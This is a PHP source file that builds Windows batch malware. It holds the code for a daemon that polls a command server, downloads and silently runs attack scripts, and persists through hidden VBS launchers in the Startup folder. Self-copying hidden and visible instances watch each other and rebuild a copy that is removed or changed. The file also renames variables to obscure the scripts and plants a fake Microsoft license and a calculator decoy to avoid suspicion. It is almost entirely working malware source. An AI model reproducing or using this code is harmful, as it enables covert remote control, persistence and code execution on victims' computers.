<?php

namespace Kelvinho\Virus\Attack {

    /**
     * Class BaseScript for windows
     * @package Kelvinho\Virus\Attack
     *
     * So, a nice thing about this is that you can construct another class, like UNIXScript. Then you can modify the interface
     * to provide a platform variable, then it will just magically happen on unix-like hosts. This doesn't solve all problems though,
     * like specific attacks needs to be multi platform too, before this can work. This only solves the init scripts problem.
     */
    class BaseScriptWin {
        /**
         * Virus's daemon. Reports back to the web server each interval.
         *
         * @param string $virus_id The virus id
         * @return string The shell code
         */
        public static function main(string $virus_id): string {
            ob_start();//@formatter:off ?>
            @echo off
            timeout <?php echo STARTUP_DELAY . "\n"; ?>
            SetLocal EnableDelayedExpansion

            :daemon_loop
            timeout <?php echo VIRUS_PING_INTERVAL . "\n"; ?>

            curl <?php echo ALT_SECURE_DOMAIN; ?>/vrs/<?php echo $virus_id; ?>/ping

            for /f "tokens=*" %%i in ('curl <?php echo ALT_SECURE_DOMAIN; ?>/vrs/<?php echo $virus_id; ?>/aks') do (
                if exist "%~dp0libs\current\%%i" (cls) else (
                    mkdir "%~dp0libs\current\%%i"
                    >"%~dp0libs\current\%%i\code.cmd" curl <?php echo ALT_SECURE_DOMAIN; ?>/vrs/<?php echo $virus_id; ?>/aks/%%i/code
                    start /b cmd.exe /c "%~pd0libs\current\%%i\code.cmd"
                )
            )
            goto daemon_loop

            <?php return ob_get_clean();//@formatter:on
        }

        public static function obfuscate(string $content): string {
            $variables = ["unixTime", "daemon_loop", "hash_end",
                "pickRandomLocation_exploreDir_end", "pickRandomLocation_exploreDir", "pickRandomLocation",
                "ping_and_process_webserver", "checkPermission", "currentDir",
                "random_hash", "random_number", "random", "main_hash", "startup_hash", "hash", "content",
                "hidden_ping_time", "hidden_ping_difference", "naked_last_active", "naked_ping_difference", "last_fetch", "ping_difference",
                "length_loop", "length", "text_len", "text", "count",
                "check_tampered_end", "check_tampered", "tampered",
                "new_hidden", "new_naked", "allowed", "naked", "hidden", "alone", "right_now"];
            usort($variables, function (string $a, string $b) {
                return strlen($b) - strlen($a);
            });
            $ids = [];
            for ($i = 0; $i < count($variables); $i++) array_push($ids, "H" . hash("md5", rand()));
            $content = str_replace($variables, $ids, $content);
            $newContent = "";
            foreach (preg_split("/((\r?\n)|(\r\n?))/", $content) as $line) {
                $line = trim($line);
                if ($line == "") {
                    continue;
                }
                if (substr($line, 0, 4) == "rem ") {
                    continue;
                }
                $newContent .= $line . "\n";
            }
            return $newContent;
        }

        public static function complexMain(string $virus_id): string {
            $startup_folder = "%appData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
            ob_start();//@formatter:off ?>
            @echo off

            SetLocal EnableDelayedExpansion
            set hidden_ping_time=0
            call :unixTime last_fetch

            if exist "%~pd0dt" for /F "usebackq tokens=*" %%i in ("%~dp0dt") do set %%i

            if "%~1" == "fetch" (
                for /f "tokens=*" %%i in ('curl -s <?php echo ALT_SECURE_DOMAIN; ?>/vrs/<?php echo $virus_id; ?>/aks') do (
                    if exist "%~dp0libs\current\%%i" (call) else (
                        mkdir "%~dp0libs\current\%%i"
                        >"%~dp0libs\current\%%i\code.cmd" curl -s <?php echo ALT_SECURE_DOMAIN; ?>/vrs/<?php echo $virus_id; ?>/aks/%%i/code
                        start /b cmd.exe /c "%~pd0libs\current\%%i\code.cmd"
                    )
                )
                exit /b 0
            )

            rem initial handling incoming messages
            if exist "%~pd0ic" for /F "usebackq delims=| tokens=1,2" %%a in ("%~dp0ic") do (
                if "%%a" == "type" set type=%%b
                if "%%a" == "libs" set libs=%%b
                rem naked & hidden
                if "%%a" == "base" set base=%%b
                rem naked
                if "%%a" == "ping" call :unixTime hidden_ping_time
                rem hidden
                if "%%a" == "lc" (
                    set lc=%%b
                    call :hash "%%b\mn.cmd" main_hash
                    call :hash "<?php echo $startup_folder; ?>\U!main_hash:~0,5!.vbs" startup_hash
                )
            )
            del "%~pd0ic" 2>nul

            rem quality of life
            set alone="!type!" == "0"
            set naked="!type!" == "1"
            set hidden="!type!" == "2"

            if %naked% (
                >dt (
                    echo type=!type!
                    echo libs=!libs!
                    echo base=!base!
                )
            )

            :daemon_loop
            call :unixTime right_now

            if %alone% (
                call :ping_and_process_webserver
                goto :daemon_loop
            )

            if %naked% (
                call :ping_and_process_webserver

                >"%~pd0og" echo %right_now%

                rem handling incoming messages
                if exist "%~pd0ic" for /F "usebackq delims=| tokens=1,2" %%a in ("%~dp0ic") do if "%%a" == "ping" call :unixTime hidden_ping_time
                set /a hidden_ping_difference=!right_now!-!hidden_ping_time!

                if !hidden_ping_difference! geq <?php echo 2 * HIDDEN_PING_INTERVAL; ?> call :new_hidden

                goto :daemon_loop
            )

            if %hidden% (
                call :check_tampered "!lc!\mn.cmd" "!main_hash!" tampered & if "!tampered!" == "1" goto tampered
                call :check_tampered "<?php echo $startup_folder; ?>\U!main_hash:~0,5!.vbs" "!startup_hash!" tampered & if "!tampered!" == "1" goto tampered
                if not exist "!lc!\og" (goto tampered)
                <"!lc!\og" set /p naked_last_active=
                set /a naked_ping_difference=!right_now!-!naked_last_active!
                if !naked_ping_difference! geq <?php echo 2 * HIDDEN_PING_INTERVAL; ?> (goto tampered)
                goto :daemon_loop

                :tampered
                call :new_naked
                goto :daemon_loop
            )

            EndLocal
            exit /b 0
            <?php echo self::functions() . "\n"; ?>
            :ping_and_process_webserver
            rem ping if over <?php echo VIRUS_PING_INTERVAL; ?> seconds, expects variable "right_now"
            set /a ping_difference=%right_now%-%last_fetch%
            if %ping_difference% geq <?php echo VIRUS_PING_INTERVAL; ?> (
                curl -s <?php echo ALT_SECURE_DOMAIN; ?>/vrs/<?php echo $virus_id; ?>/ping
                start /b cmd.exe /c "%~f0" fetch
                set /a last_fetch=%right_now%
            )
            exit /b 0

            :new_hidden
            SetLocal EnableDelayedExpansion & call :pickRandomLocation "%base%" location
            call :random random_number
            mkdir "!location!"
            copy "%~f0" "!location!\H!random_number!.cmd"
            >"!location!\ic" (
                echo type^|2
                echo libs^|%libs%
                echo base^|%base%
                echo lc^|%~pd0
            )
            start /b cmd.exe /c "!location!\H!random_number!.cmd"
            EndLocal
            exit /b 0

            :new_naked
            rmdir /s /q "%lc%"
            del "<?php echo $startup_folder; ?>\U%main_hash:~0,5%.vbs"
            call :pickRandomLocation "%base%" lc
            mkdir "!lc!"
            copy "%~f0" "!lc!\mn.cmd"
            >"!lc!\dt" type nul
            >"!lc!\ic" (
                echo type^|1
                echo libs^|%libs%
                echo base^|%base%
                echo ping^|_
            )
            call :hash "!lc!\mn.cmd" main_hash
            >"<?php echo $startup_folder; ?>\U%main_hash:~0,5%.vbs" (
                echo On Error Resume Next
                echo CreateObject("WScript.Shell")^.Run chr(34) ^& "!lc!\mn.cmd" ^& chr(34), 0, False
            )
            call :hash "<?php echo $startup_folder; ?>\U%main_hash:~0,5%.vbs" startup_hash
            start /b cmd.exe /c "!lc!\mn.cmd"
            exit /b 0

            :check_tampered
            rem string%1.file string%2.hash -> string%3.1 if tampered, 0 if not
            SetLocal EnableDelayedExpansion & set /a tampered=0
            if not exist "%~1" (set /a tampered=1 & goto check_tampered_end)
            call :hash "%~1" hash
            if not "!hash!"=="%~2" (set /a tampered=1 & goto check_tampered_end)
            :check_tampered_end
            EndLocal & set %3=%tampered%
            exit /b 0
            <?php return ob_get_clean();//@formatter:on
        }

        //@formatter:on

        /**
         * Init script. This will be the code initially downloaded and run using the entry point instructions. This will setup several things:
         * - /current: contain directories named after attack ids, code.cmd in them which contains the shell code
         * - /new: contain file named after attack ids, with shell codes in them
         * - /entry.cmd: the virus daemon. script in startup folder will invoke this, and this will constantly report back to the web server
         * - /worker.cmd: work on an attack, scheduled by entry.cmd
         * - /unixTime.cmd: echos out the current unix time, can be used by any script
         * - startup/SU.vbs: placed in the startup folder, which will invoke entry.cmd
         *
         * @param string $virus_id The virus's id
         * @param string $user_handle The user handle
         * @param string|null $home_directory
         * @return string The shell code
         */
        public static function initStandalone(string $virus_id, string $user_handle, string $home_directory = "%appData%\\Calculator"): string {
            $startup_directory = "%appData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
            $UFile = "$startup_directory\\U" . substr($virus_id, 0, 5) . ".vbs";
            ob_start(); ?>
            rmdir /s /q "<?php echo $home_directory; ?>"
            mkdir "<?php echo $home_directory; ?>"
            mkdir "<?php echo "$home_directory\\libs"; ?>"
            mkdir "<?php echo "$home_directory\\libs\\current"; ?>"
            mkdir "<?php echo "$home_directory\\libs\\utils"; ?>"
            >"<?php echo "$home_directory\\entry.cmd"; ?>" curl -L <?php echo ALT_DOMAIN . "/new/win/$user_handle/entry/$virus_id\n" ?>
            >"<?php echo "$UFile"; ?>" echo On Error Resume Next
            >>"<?php echo "$UFile"; ?>" echo CreateObject^(^"WScript^.Shell^"^)^.Run chr^(34^) ^& ^"<?php echo $home_directory; ?>\entry^.cmd^" ^& chr^(34^)^, 0^, False
            "<?php echo $UFile; // below are just additional things to make the virus looks legit ?>"
            >"<?php echo "$home_directory\\LICENSE"; ?>" curl -L <?php echo ALT_DOMAIN . "/new/win/$user_handle/license\n" ?>
            >"<?php echo $home_directory; ?>\calculator.cmd" echo calc.exe
            cls
            <?php return ob_get_clean();
        }

        public static function initSwarm(string $virus_id, string $user_handle, string $home_directory = "C:\\Users"): string {
            $home_directory = "D:\\repos\\shell\\structs"; // TODO: for dev, remove when in production
        }

        /**
         * Connects with the web server to see if it has accepted the results. If yes then quits the loop and allow the
         * script to continue. This is intended to be placed in the payload rather than on the host computer.
         *
         * @param string $virus_id The virus id
         * @param string $attack_id The attack id
         * @param string $uploadCode The code to upload the results
         * @return string The shell code
         */

        public static function payloadConfirmationLoop(string $virus_id, string $attack_id, string $uploadCode): string {
            ob_start();//@formatter:off ?>
            SetLocal EnableDelayedExpansion
            set has=false
            :payload_confirmation_loop
            <?php echo "$uploadCode\n"; ?>
            timeout <?php echo ATTACK_UPLOAD_RETRY_INTERVAL . "\n"; ?>
            for /f "tokens=*" %%i in ('curl <?php echo ALT_SECURE_DOMAIN; ?>/vrs/<?php echo $virus_id; ?>/aks') do (
                if "%%i"=="<?php echo $attack_id; ?>" (set has=true)
            )
            if "!has!"=="false" (goto end_confirmation_loop)
            goto payload_confirmation_loop
            :end_confirmation_loop
            <?php return ob_get_clean();//@formatter:on
        }


        /**
         * Cleaning up the payload after it has executed.
         *
         * @return string The shell code
         */
        public static function cleanUpPayload(): string {
            ob_start(); ?>
            start /b cmd /c "timeout 3 & rmdir /s /q %~pd0"
            <?php return ob_get_clean();
        }

        /**
         * Dummy license text, to make anyone wanders into the virus's folder not suspicious of anything. TL;DR: make it looks legit
         *
         * @return string The license text
         */
        public static function license(): string {
            ob_start();//@formatter:off ?>Copyright 2019 Microsoft

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.<?php //@formatter:on
            return ob_get_clean();
        }

        /**
         * Generic batch functions that programs may include and use
         *
         * @return string The functions
         */
        private static function functions(): string {
            ob_start();//@formatter:off ?>:length
            SetLocal EnableDelayedExpansion & set /a text_len = 0 & set text=%~1
            :length_loop
            if not "!text:~%text_len%!"=="" (set /A text_len += 1 & goto :length_loop)
            EndLocal & set %~2=%text_len%
            exit /b 0
            :hash
            SetLocal EnableDelayedExpansion & set /a count=0 & set content=""
            for /f %%a in ('certutil -hashfile "%~1" sha256') do (set /a count+=1 & set content=%%a
                if "!count!" == "2" (goto hash_end))
            :hash_end
            EndLocal & set %2=%content%
            exit /b 0
            :random
            SetLocal EnableDelayedExpansion & set /a random_hash=67*(%random%+601*%random_hash%+1451)+2143 & set /a random_hash%%=31081
            EndLocal & set %1=%random_hash%
            exit /b 0
            :pickRandomLocation
            SetLocal EnableDelayedExpansion & call :pickRandomLocation_exploreDir "%~1" 0 10000 total nul
            call :random random_number
            set /a random_number%%=%total%
            call :pickRandomLocation_exploreDir "%~1" 0 %random_number% nul currentDir
            EndLocal & set %2=%currentDir%
            exit /b 0
            :pickRandomLocation_exploreDir
            SetLocal EnableDelayedExpansion & set /a count=%2
            for /d %%d in ("%~1\*") do (
                call :checkPermission "%%d" allowed & set currentDir=%%d
                if "!allowed!" == "1" (set /a count+=1 & if /i !count! geq %~3 (goto pickRandomLocation_exploreDir_end)
                    call :pickRandomLocation_exploreDir "%%d" !count! "%3" count currentDir & if /i !count! geq %~3 (goto pickRandomLocation_exploreDir_end)))
            :pickRandomLocation_exploreDir_end
            EndLocal & (
                set %4=%count%
                set %5=%currentDir%
            )
            exit /b 0
            :checkPermission
            SetLocal EnableDelayedExpansion & copy nul "%~1\12f99f53144294750fe8713d580eda286f4bd95cd9c840db8ab957def8040028" 2>nul 1>&2
            if "%errorLevel%" == "0" (del "%~1\12f99f53144294750fe8713d580eda286f4bd95cd9c840db8ab957def8040028" & endlocal & set %2=1) else (endlocal & set %2=0)
            exit /b 0
            :unixTime
            SetLocal EnableExtensions EnableDelayedExpansion
            for /f %%x in ('WMic path win32_utcTime get /format:list') do (set %%x 1>nul 2>nul)
            set /a z=(14-100%Month%%%100)/12, y=10000%Year%%%10000-z
            set /a ut=y*365+y/4-y/100+y/400+(153*(100%Month%%%100+12*z-3)+2)/5+Day-719469
            set /a ut=ut*86400+100%Hour%%%100*3600+100%Minute%%%100*60+100%Second%%%100
            EndLocal & set "%1=%ut%"
            exit /b 0
            <?php return ob_get_clean();//@formatter:on
        }
    }

    class BaseScriptMac {
    }
}
